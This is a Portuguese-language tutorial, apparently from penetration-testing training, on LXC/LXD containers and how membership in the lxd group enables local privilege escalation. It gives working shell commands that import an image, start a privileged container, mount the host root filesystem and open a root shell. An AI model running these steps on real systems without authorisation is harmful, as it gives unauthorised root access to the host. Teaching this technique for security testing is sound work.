Os contêineres compartilham um sistema operacional e isolam os processos de aplicativos, enquanto a virtualização clássica permite a execução simultânea de múltiplos sistemas operacionais em um único hardware.

Tanto o isolamento quanto a virtualização são cruciais para a gestão eficiente de recursos e segurança, facilitando o monitoramento de erros e o isolamento de processos que requerem privilégios elevados, como aplicativos web ou APIs, protegendo o sistema host contra possíveis escalonamentos de privilégios.

## Contêineres Linux
Linux Containers (LXC) é uma técnica de virtualização em nível de sistema operacional que permite a execução isolada de vários sistemas Linux em um único host, compartilhando o kernel do sistema.

LXC é popular por sua facilidade de uso, menor consumo de recursos em comparação com máquinas virtuais e uma interface padrão que facilita o gerenciamento de múltiplos contêineres. Ele também oferece portabilidade, permitindo que aplicativos funcionem em diferentes sistemas e nuvens. 

A disseminação do LXC foi impulsionada pela plataforma Docker, que popularizou os contêineres Linux, mantendo uma configuração consistente desde a criação até a implantação de contêineres e aplicativos.

### Daemon Linux

O Linux Daemon ( [LXD](https://github.com/lxc/lxd) ) é similar em alguns aspectos, mas é projetado para conter um sistema operacional completo. Portanto, não é um contêiner de aplicativo, mas um contêiner de sistema. Antes de podermos usar este serviço para escalar nossos privilégios, precisamos estar no grupo `lxc`ou `lxd`. Podemos descobrir isso com o seguinte comando:

```shell-session
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

A partir daqui, agora há várias maneiras de explorar `LXC`/ `LXD`. Podemos criar nosso próprio contêiner e transferi-lo para o sistema de destino ou usar um contêiner existente.

Infelizmente, os administradores geralmente usam modelos que têm pouca ou nenhuma segurança. Essa atitude tem como consequência que já temos ferramentas que podemos usar contra o sistema nós mesmos.

```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

Modelos de contêineres em ambientes de teste geralmente não têm senhas para facilitar o acesso e a usabilidade. Focar em segurança nesses casos poderia complicar e retardar o processo de iniciação. Se um contêiner vulnerável estiver presente no sistema, ele pode ser explorado importando-o como uma imagem.

```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list
```

Após verificar que essa imagem foi importada com sucesso, podemos iniciar a imagem e configurá-la especificando a flag `security.privileged` e o caminho raiz para o contêiner. Essa flag desabilita todos os recursos de isolamento que nos permitem atuar no host.

```shell-session
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Depois de fazer isso, podemos iniciar o contêiner e fazer login nele. No contêiner, podemos então ir para o caminho que especificamos para acessar o `resource`do sistema host como `root`.

```shell-session
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root
```

































































